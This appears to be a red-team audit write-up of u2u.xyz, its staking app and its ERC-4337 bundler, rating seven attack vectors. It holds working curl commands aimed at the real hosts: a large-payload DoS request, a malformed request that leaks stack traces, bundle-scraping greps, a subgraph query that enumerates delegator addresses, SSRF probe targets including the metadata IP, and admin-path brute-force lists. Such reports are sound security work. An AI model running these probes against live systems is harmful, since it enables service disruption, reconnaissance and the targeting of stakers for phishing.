# U2U Web2 Red Team — 7-Vector Audit (2026-08)

**Targets:** u2u.xyz, staking.u2u.xyz, bundler.u2u.xyz
**Stack:** Next.js App Router (static) + Prismic CMS + React SPA (staking) + ERC-4337 aa-bundler + The Graph subgraphs
**CDN:** Cloudflare (all targets)

## 1. Next.js Server Actions → BLOCKED
- No `$ACTION_ID` in any of 11 JS chunks
- `x-nextjs-prerender: 1` + `x-nextjs-cache: HIT` = static export/ISR
- RSC fetch returns static Flight payload, no server action handlers
- **Verdict: no attack surface. Mark as BLOCKED, don't burn rounds.**

## 2. Next.js Image SSRF → BLOCKED
Double defense:
- Next.js `remotePatterns` blocks non-whitelisted domains → 400
- Cloudflare WAF blocks encoded payloads (`%3A%2F%2F`, double-encoded) → 403
- Tested: internal IPs (127.0.0.1, 10.0.0.1, 172.16.0.1, 192.168.1.1, 169.254.169.254), file://, unicode bypass, URL-encoded, double-encoded
- **Verdict: blocked at two layers. Safe.**

## 3. Prismic CMS → LOW findings
Prismic repo: `u2u-cms` (publicly readable via `u2u-cms.cdn.prismic.io/api/v2`)

| Endpoint | Response | Finding |
|----------|----------|---------|
| `GET /api/preview` | 307 → homepage | Draft mode exists, needs valid cookie+token |
| `GET /api/exit-preview` | 200 `{"success":true}` | **Unauthenticated** — anyone can call this |
| `GET /api/preview?token=test&documentId=test` | 500 | **Error handling leak** — invalid params trigger 500 |

Document types: blog_post, blog_post_categories, page, solutions, blog_homepage, ecosystem, grant, hero, build, content, posts

**Recon commands:**
```bash
# Public API access
curl -s "https://u2u-cms.cdn.prismic.io/api/v2"

# Unauthenticated exit-preview
curl -s "https://u2u.xyz/api/exit-preview"  # {"success":true}

# Trigger 500
curl -s "https://u2u.xyz/api/preview?token=test&documentId=test"
```

## 4. Auth Bypass (NextAuth) → BLOCKED
All `/api/auth/*` endpoints return 404. No NextAuth installed. Site is purely static.

## 5. Admin Panel → BLOCKED
18 paths brute-forced, all 404: `/admin`, `/dashboard`, `/console`, `/api/admin`, `/api/dashboard`, `/admin/login`, `/administrator`, `/wp-admin`, `/panel`, `/_next/admin`, `/api/v1/admin`, `/api/auth/admin`, `/api/internal`, `/internal`, `/api/health`, `/api/status`, `/api/metrics`, `/api/debug`

## 6. Staking App → MEDIUM findings

### Stack
- React SPA (webpack, not Next.js)
- RainbowKit + wagmi/viem
- Apollo Server GraphQL backend
- The Graph subgraphs for on-chain data

### Credential leaks in JS bundle
- WalletConnect Project ID: `815145290a10a9393358a85a318d47ad` (client-side, expected)
- Google Analytics: `G-C9WC1Q3S7W`

### Endpoints discovered via JS bundle analysis
```bash
# RPC — fully open, no auth
curl -s "https://rpc-mainnet.u2u.xyz/" -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'
# → go-u2u/v1.1.3-stable-c7615a0e/linux-amd64/go1.23.4, chain 39, 24 peers

# GraphQL staking — Apollo Server, only calculateApr query
curl -s "https://staking-graphql.u2u.xyz/graphql" -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ calculateApr(validatorId: 1, amount: \"1000\", duration: 355) }"}'
# → {"data":{"calculateApr":"0"}}

# Subgraph — FULL DATA LEAK
curl -s "https://graph.u2u.xyz/subgraphs/name/u2u/sfc-subgraph-v3" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ delegations(first: 5) { id validatorId stakedAmount delegator { id address } } }"}'
# → Returns real delegator addresses + staked amounts
```

### The Graph subgraph data leak pattern
- GraphQL introspection returns full schema: Delegation, Delegator, Epoch, LockedUp, Staking, TransactionCount
- Delegation fields: id, validatorId, stakedAmount, delegator { id, address }
- Staking fields: id, totalSelfStaked, totalDelegated, totalStaked, totalValidator, totalDelegator
- No auth required — anyone can enumerate all delegators and their stakes
- **Impact:** Whale tracking, targeted phishing, MEV opportunities

### JS bundle reconnaissance technique
```bash
# Extract all API endpoints from minified bundle
curl -s "https://staking.u2u.xyz/static/js/main.*.js" | grep -oP 'https?://[a-zA-Z0-9.-]+\.u2u\.xyz[^"'\''\s,;)]*' | sort -u

# Extract contract addresses
curl -s "https://staking.u2u.xyz/static/js/main.*.js" | grep -oP '0x[a-fA-F0-9]{40}' | sort -u

# Extract RPC URLs
curl -s "https://staking.u2u.xyz/static/js/main.*.js" | grep -oP 'https?://[^"'\''\s,;)]*rpc[^"'\''\s,;)]*' | sort -u
```

## 7. ERC-4337 Bundler → HIGH findings

### Server fingerprint
```
aa-bundler/0.7.0/unsafe
Node.js + Express (body-parser)
Path: /usr/src/app/
```

### Methods supported
`eth_sendUserOperation`, `eth_estimateUserOperationGas`, `eth_supportedEntryPoints`, `eth_chainId`, `web3_clientVersion`, `eth_getUserOperationByHash`, `eth_getUserOperationReceipt`

### Methods blocked
`eth_sendTransaction`, `eth_accounts`, `personal_listAccounts`, `eth_getLogs`, `debug_bundler_*`

### EntryPoint: `0xdbd3939BeeC5DC02Df4820212820cB078d95DD32`

### 🔴 DoS: No payload size limit
```bash
# 100KB payload → 200 OK, processed
curl -s -o /dev/null -w "HTTP: %{http_code}" "https://bundler.u2u.xyz/rpc" \
  -X POST -H "Content-Type: application/json" \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"eth_chainId\",\"params\":[\"$(python3 -c "print('A'*100000)")\"],\"id\":1}"
```

### 🔴 Stack trace leak via malformed JSON
```bash
# Malformed JSON → full stack trace with server paths
curl -s "https://bundler.u2u.xyz/rpc" -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_sendUserOperation","params":[{"sender":"0xdbd..."}],"0xdbd..."],"id":1}'
# Leaks: /usr/src/app/node_modules/body-parser/lib/types/json.js:92:19
#         /usr/src/app/node_modules/raw-body/index.js:238:16
```

### Injection attempts (all blocked)
- Command injection in sender: hex validation blocks
- SQLi in callData: Cloudflare WAF 1020 block
- XXE in params: Cloudflare WAF 1020 block
- SSTI `{{7*7}}`: hex validation blocks
- Prototype pollution: processed but rejected with valid error
- Large number (10^50): accepted (200 OK)

### 🔴 `/unsafe` flag
`aa-bundler/0.7.0/unsafe` — indicates bundler runs with `--unsafe` mode. In eth-infinitism lineage, this skips opcode/stake tracer checks (NOT sig validation). Impact: griefing-hardener, not a sig bypass. But combined with no size limit, amplifies DoS surface.

## Summary table

| Vector | Severity | Status |
|--------|----------|--------|
| Server Actions RCE | N/A | ❌ No attack surface |
| Image SSRF | N/A | ❌ Cloudflare + Next.js double block |
| Prismic exit-preview | LOW | ⚠️ Unauthenticated, minimal impact |
| Prismic 500 error | LOW | ⚠️ Error handling info leak |
| Auth bypass | N/A | ❌ No auth system |
| Admin panel | N/A | ❌ Not found |
| RPC mainnet open | MEDIUM | 🔴 No rate limit, full access |
| Subgraph data leak | MEDIUM | 🔴 Delegator addresses + amounts exposed |
| WalletConnect ID leak | LOW | 🟡 Client-side, expected |
| Bundler DoS | HIGH | 🔴 No payload size limit |
| Bundler /unsafe | HIGH | 🔴 Reduced validation |
| Bundler stack trace | MEDIUM | 🔴 Server path disclosure |